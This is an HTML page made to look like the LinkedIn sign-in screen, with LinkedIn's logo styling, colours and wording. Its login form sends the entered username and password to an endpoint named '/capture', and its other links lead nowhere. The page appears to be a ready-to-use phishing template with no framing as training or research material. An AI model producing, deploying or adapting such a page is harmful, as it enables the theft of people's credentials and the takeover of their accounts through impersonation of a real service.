<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>LinkedIn Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f3f2ef;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
.logo{color:#0a66c2;font-size:2rem;font-weight:700;margin-bottom:24px;letter-spacing:-1px}
.logo span{font-size:1.2em}
.card{background:#fff;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.08);
padding:32px 24px;width:100%;max-width:400px}
h1{font-size:1.8rem;color:#000;font-weight:600;margin-bottom:4px}
p.sub{font-size:.9rem;color:#666;margin-bottom:24px}
label{display:block;font-size:.875rem;color:#000;font-weight:600;margin-bottom:4px}
input{width:100%;padding:12px;border:1px solid #b0b0b0;border-radius:4px;
font-size:1rem;margin-bottom:16px;outline:none;color:#000}
input:focus{border-color:#0a66c2;box-shadow:0 0 0 1px #0a66c2}
.btn{width:100%;padding:12px;background:#0a66c2;color:#fff;border:none;
border-radius:24px;font-size:1rem;font-weight:600;cursor:pointer}
.btn:hover{background:#004182}
.forgot{text-align:center;margin-top:16px}
.forgot a{color:#0a66c2;text-decoration:none;font-size:.875rem;font-weight:600}
.sep{display:flex;align-items:center;margin:20px 0;gap:12px}
.sep .line{flex:1;height:1px;background:#ddd}
.sep span{color:#666;font-size:.875rem}
.new{display:block;width:100%;padding:12px;border:1px solid #2a2a2a;border-radius:24px;
background:transparent;color:#2a2a2a;font-size:1rem;font-weight:600;cursor:pointer;text-align:center;text-decoration:none}
.new:hover{background:#f3f2ef;border-color:#000}
</style>
</head>
<body>
<div class="logo">Linked<span>in</span></div>
<div class="card">
<h1 data-i18n="title">Sign in</h1>
<p class="sub" data-i18n="subtitle">Stay updated on your professional world</p>
<form method="POST" action="/capture">
<label data-i18n="email_label">Email or Phone</label>
<input type="text" name="username" required autocomplete="off">
<label data-i18n="pass_label">Password</label>
<input type="password" name="password" required>
<button type="submit" class="btn" data-i18n="signin">Sign in</button>
</form>
<div class="forgot"><a href="#" data-i18n="forgot">Forgot password?</a></div>
<div class="sep"><div class="line"></div><span data-i18n="or">or</span><div class="line"></div></div>
<a href="#" class="new" data-i18n="new">New to LinkedIn? Join now</a>
</div>
